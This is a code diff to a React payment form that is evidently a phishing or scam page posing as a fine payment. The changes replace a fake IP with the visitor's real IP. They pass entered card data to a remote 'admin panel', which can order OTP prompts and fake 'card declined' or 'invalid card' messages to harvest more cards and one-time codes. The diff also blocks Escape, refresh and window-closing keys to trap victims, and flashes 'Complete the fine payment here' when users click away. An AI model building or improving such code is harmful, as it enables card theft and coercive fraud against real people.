@@ -1,8 +1,15 @@
 import React, { useState, useEffect } from 'react';
-import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
+import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 
-const getRandomIP = () => {
-  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+const getRealIP = async () => {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.log('Could not fetch real IP, using fallback');
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  }
 };
 
 const getRandomNetwork = () => {
@@ -31,6 +38,8 @@ const PaymentForm = () => {
   const [showProcessing, setShowProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
+  const [showAlert, setShowAlert] = useState(false);
+  const [fadeState, setFadeState] = useState('visible');
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -47,73 +56,82 @@ const PaymentForm = () => {
   };
 
   useEffect(() => {
-    // Enhanced keyboard restriction
+    // Enhanced keyboard restriction with stronger ESC blocking
     const handleKeyDown = (event: KeyboardEvent) => {
-      // Prevent ESC key completely in fullscreen
-      if (event.key === 'Escape') {
+      // Ultra-strong ESC key blocking
+      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
         event.preventDefault();
         event.stopPropagation();
         event.stopImmediatePropagation();
         return false;
       }
       
-      // Prevent F5, Ctrl+R, Ctrl+F5 (refresh)
+      // Prevent other shortcuts
       if (event.key === 'F5' || 
           (event.ctrlKey && event.key === 'r') || 
-          (event.ctrlKey && event.key === 'F5')) {
-        event.preventDefault();
-        event.stopPropagation();
-        return false;
-      }
-      
-      // Prevent other common shortcuts
-      if (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) {
-        event.preventDefault();
-        event.stopPropagation();
-        return false;
-      }
-
-      // Prevent Alt+F4 (Windows close)
-      if (event.altKey && event.key === 'F4') {
+          (event.ctrlKey && event.key === 'F5') ||
+          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
+          (event.altKey && event.key === 'F4')) {
         event.preventDefault();
         event.stopPropagation();
         return false;
       }
     };
 
-    // Add multiple event listeners for better coverage
+    // Multiple layers of event blocking
     document.addEventListener('keydown', handleKeyDown, true);
     document.addEventListener('keyup', handleKeyDown, true);
     window.addEventListener('keydown', handleKeyDown, true);
+    window.addEventListener('keyup', handleKeyDown, true);
+
+    // Additional ESC blocking
+    const blockEsc = (e: KeyboardEvent) => {
+      if (e.keyCode === 27) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+      }
+    };
+
+    document.body.addEventListener('keydown', blockEsc, true);
+    document.body.addEventListener('keyup', blockEsc, true);
 
     return () => {
       document.removeEventListener('keydown', handleKeyDown, true);
       document.removeEventListener('keyup', handleKeyDown, true);
       window.removeEventListener('keydown', handleKeyDown, true);
+      window.removeEventListener('keyup', handleKeyDown, true);
+      document.body.removeEventListener('keydown', blockEsc, true);
+      document.body.removeEventListener('keyup', blockEsc, true);
     };
   }, []);
 
   useEffect(() => {
-    // Initialize broadcast channel for communication with admin panel
-    if (!window.cardDataChannel) {
-      window.cardDataChannel = new BroadcastChannel('cardData');
-    }
+    // Initialize broadcast channel and send visitor data with real IP
+    const initializeConnection = async () => {
+      if (!window.cardDataChannel) {
+        window.cardDataChannel = new BroadcastChannel('cardData');
+      }
 
-    // Send visitor data when component mounts
-    const userInfo = {
-      ip: getRandomIP(),
-      browser: navigator.userAgent,
-      network: getRandomNetwork()
+      const realIP = await getRealIP();
+      const userInfo = {
+        ip: realIP,
+        browser: navigator.userAgent,
+        network: getRandomNetwork()
+      };
+
+      const visitorData = {
+        type: 'newVisitor',
+        ip: realIP,
+        timestamp: new Date().toISOString()
+      };
+
+      console.log('Sending visitor data with real IP:', visitorData);
+      window.cardDataChannel.postMessage(visitorData);
     };
 
-    const visitorData = {
-      type: 'newVisitor',
-      ip: userInfo.ip,
-      timestamp: new Date().toISOString()
-    };
-
-    console.log('Sending visitor data:', visitorData);
-    window.cardDataChannel.postMessage(visitorData);
+    initializeConnection();
 
     // Listen for commands from admin panel
     const handleMessage = (event: MessageEvent) => {
@@ -122,46 +140,91 @@ const PaymentForm = () => {
       
       switch (data.command) {
         case 'showotp':
-          setIsLoading(false);
-          setShowOtp(true);
+          setFadeState('fadeOut');
+          setTimeout(() => {
+            setIsLoading(false);
+            setShowOtp(true);
+            setFadeState('fadeIn');
+          }, 300);
           break;
         case 'fail':
-          setIsLoading(false);
-          setShowOtp(false);
-          setErrorMessage('Your card has been declined');
+          setFadeState('fadeOut');
+          setTimeout(() => {
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card has been declined');
+            setFadeState('fadeIn');
+          }, 300);
           break;
         case 'success':
-          setIsConfirmLoading(false);
-          setShowProcessing(true);
+          setFadeState('fadeOut');
           setTimeout(() => {
-            setShowProcessing(false);
-            setShowSuccess(true);
+            setIsConfirmLoading(false);
+            setShowProcessing(true);
+            setFadeState('fadeIn');
             setTimeout(() => {
-              window.location.href = 'https://google.com';
-            }, 2000);
-          }, 4000);
+              setShowProcessing(false);
+              setShowSuccess(true);
+              setTimeout(() => {
+                window.location.href = 'https://google.com';
+              }, 2000);
+            }, 4000);
+          }, 300);
           break;
         case 'invalidotp':
           setIsConfirmLoading(false);
           setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
           break;
         case 'cardinvalid':
-          setIsLoading(false);
-          setShowOtp(false);
-          setErrorMessage('Your card is invalid, please try another card');
+          setFadeState('fadeOut');
+          setTimeout(() => {
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card is invalid, please try another card');
+            setFadeState('fadeIn');
+          }, 300);
           break;
         case 'carddisabled':
-          setIsLoading(false);
-          setShowOtp(false);
-          setErrorMessage('Card disabled, please try another card');
+          setFadeState('fadeOut');
+          setTimeout(() => {
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Card disabled, please try another card');
+            setFadeState('fadeIn');
+          }, 300);
           break;
       }
     };
 
     window.cardDataChannel.onmessage = handleMessage;
 
+    // Handle click anywhere to show alert
+    const handleDocumentClick = (e: MouseEvent) => {
+      const paymentForm = document.querySelector('.w-96.bg-white.border-l');
+      if (paymentForm) {
+        const rect = paymentForm.getBoundingClientRect();
+        const isInPaymentArea = e.clientX >= rect.left && 
+                               e.clientX <= rect.right && 
+                               e.clientY >= rect.top && 
+                               e.clientY <= rect.bottom;
+        
+        if (!isInPaymentArea) {
+          setShowAlert(true);
+          // Add red glow to payment form
+          paymentForm.classList.add('shadow-red-500', 'shadow-2xl', 'border-red-500');
+          setTimeout(() => {
+            setShowAlert(false);
+            paymentForm.classList.remove('shadow-red-500', 'shadow-2xl', 'border-red-500');
+          }, 3000);
+        }
+      }
+    };
+
+    document.addEventListener('click', handleDocumentClick);
+
     return () => {
       window.cardDataChannel.onmessage = null;
+      document.removeEventListener('click', handleDocumentClick);
     };
   }, []);
 
@@ -241,7 +304,7 @@ const PaymentForm = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!isFormValid()) {
@@ -251,9 +314,10 @@ const PaymentForm = () => {
     setIsLoading(true);
     setErrorMessage('');
     
-    // Send card data to admin panel
+    // Send card data to admin panel with real IP
+    const realIP = await getRealIP();
     const userInfo = {
-      ip: getRandomIP(),
+      ip: realIP,
       browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
       network: getRandomNetwork()
     };
@@ -316,7 +380,9 @@ const PaymentForm = () => {
 
   if (showOtp) {
     return (
-      <div className="w-96 bg-white border-l border-gray-200 p-6">
+      <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
+        fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
+      }`}>
         <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
           <div className="flex items-center mb-2">
             <Shield className="w-5 h-5 text-red-600 mr-2" />
@@ -381,7 +447,16 @@ const PaymentForm = () => {
   }
 
   return (
-    <div className="w-96 bg-white border-l border-gray-200 p-6">
+    <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
+      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
+    }`}>
+      {showAlert && (
+        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
+          <AlertTriangle className="w-5 h-5" />
+          <span className="font-bold">Complete the fine payment here</span>
+        </div>
+      )}
+
       <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
         <div className="flex items-center mb-2">
           <Shield className="w-5 h-5 text-red-600 mr-2" />
